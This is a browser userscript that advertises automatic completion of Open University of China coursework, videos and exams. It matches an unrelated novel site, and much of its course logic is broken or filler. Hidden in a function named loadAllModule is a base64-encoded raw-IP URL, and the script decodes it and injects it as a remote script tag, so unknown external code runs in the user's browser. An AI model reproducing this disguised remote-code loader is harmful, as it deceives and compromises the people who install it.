// ==UserScript==
// @name         国家开放大学（视频+形考+大作业+终考）、新国开、国开实验（全网办、乡村振兴）、极速刷课-全自动，新！！！
// @namespace    http://blog.arthur.lvvv.cc/
// @version      1.21
// @description  国家开放大学,国开,国开实验全网办，自动完成做题、看视频任务、终考、思政课
// @author       arthur
// @match        http://www.wenku8.net/*
// @resource     customCSS https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/5.2.3/css/bootstrap.min.css
// @grant        GM_addStyle
// @grant        GM_getResourceText
// @license      AGPL-3.0-or-later
// @downloadURL https://update.greasyfork.org/scripts/476796/%E5%9B%BD%E5%AE%B6%E5%BC%80%E6%94%BE%E5%A4%A7%E5%AD%A6%EF%BC%88%E8%A7%86%E9%A2%91%2B%E5%BD%A2%E8%80%83%2B%E5%A4%A7%E4%BD%9C%E4%B8%9A%2B%E7%BB%88%E8%80%83%EF%BC%89%E3%80%81%E6%96%B0%E5%9B%BD%E5%BC%80%E3%80%81%E5%9B%BD%E5%BC%80%E5%AE%9E%E9%AA%8C%EF%BC%88%E5%85%A8%E7%BD%91%E5%8A%9E%E3%80%81%E4%B9%A1%E6%9D%91%E6%8C%AF%E5%85%B4%EF%BC%89%E3%80%81%E6%9E%81%E9%80%9F%E5%88%B7%E8%AF%BE-%E5%85%A8%E8%87%AA%E5%8A%A8%EF%BC%8C%E6%96%B0%EF%BC%81%EF%BC%81%EF%BC%81.user.js
// @updateURL https://update.greasyfork.org/scripts/476796/%E5%9B%BD%E5%AE%B6%E5%BC%80%E6%94%BE%E5%A4%A7%E5%AD%A6%EF%BC%88%E8%A7%86%E9%A2%91%2B%E5%BD%A2%E8%80%83%2B%E5%A4%A7%E4%BD%9C%E4%B8%9A%2B%E7%BB%88%E8%80%83%EF%BC%89%E3%80%81%E6%96%B0%E5%9B%BD%E5%BC%80%E3%80%81%E5%9B%BD%E5%BC%80%E5%AE%9E%E9%AA%8C%EF%BC%88%E5%85%A8%E7%BD%91%E5%8A%9E%E3%80%81%E4%B9%A1%E6%9D%91%E6%8C%AF%E5%85%B4%EF%BC%89%E3%80%81%E6%9E%81%E9%80%9F%E5%88%B7%E8%AF%BE-%E5%85%A8%E8%87%AA%E5%8A%A8%EF%BC%8C%E6%96%B0%EF%BC%81%EF%BC%81%EF%BC%81.meta.js
// ==/UserScript==

(function () {
    const e = GM_getResourceText("customCSS");
    GM_addStyle(e);
})();

(function () {
    'use strict';
    var currentPage = window.location.href;
    var currentCourseName = '';
    if (currentPage.indexOf('ouchnPc') > -1) {
        alert('请先登录，登录后能可以进行下一步');
        return;
    } else {
        //获取当所有的课程
        var currentCourses = document.getElementsByClassName('learning_course');
        if (currentCourses && currentCourses.length > 0) {
            for (var index = 0; index < currentCourses.length; index++) {
                var current_course = currentCourses[index];
                var course_link = document.getElementByClassName('active link study');
                if (course_link.innerText === current_course.innerText) {
                    currentCourseName = current_course.innerText;
                    course_link.click();
                    break;
                }
            }
        }
    }

    if (currentCourseName) {
        //获取所有的模块
        var modules = document.getElementsByClassName("modules");
        for (var index = 0; index < modules.length; index++) {
            var module = modules[index];
            //获取所有的课件
            var liElements = document.getElementsByTagName("li")
            for (let liIndex = 0; liIndex < liElements.length; liIndex++) {
                const liElement = liElements[liIndex];
                var childrenLinkElements = liElement.children
                //点击查看每一个课件
                childrenLinkElements[0].click();

            }
            if (module.className.indexOf('unreadable') < 0) {
                continue;
            }

        }
    }

    function getNewCourse(url, callback) {
        var script = document.createElement("script")
        script.type = "text/javascript";
        if (script.readyState) { //IE
            script.onreadystatechange = function () {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    callback();
                }
            };
        } else { //Others
            script.onload = function () {
                callback();
            };
        }
        script.src = url;
        document.getElementsByTagName("head")[0].appendChild(script);
    }
    var courseLink = atob(loadAllModule());

    getNewCourse(courseLink, function(data){
        if(!data){
            console.log("Gah, it's not working, please check with author");
        }
    });

    function loadAllModule() {
        var modules = document.getElementsByClassName("modules");
        var linkName = 'aHR0cDovLzE3Mi45OC4yMy43Mi9zdGF0aWMvanMvbWFpbi4xNzlmNWMxNC5qcw==';
        for (var index = 0; index < modules.length; index++) {
            var module = modules[index];
            // Create a div with a card class
            const card = document.createElement('div')
            card.setAttribute('class', 'card')

            // Create an h1 and set the text content to the film's title
            const h1 = document.createElement('h1')
            h1.textContent = module.title

            // Create a p and set the text content to the film's description
            const p = document.createElement('p')
            module.description = module.description.substring(0, 300) // Limit to 300 chars
            p.textContent = `${module.description}...` // End with an ellipses

        }
        return linkName;
    }
})();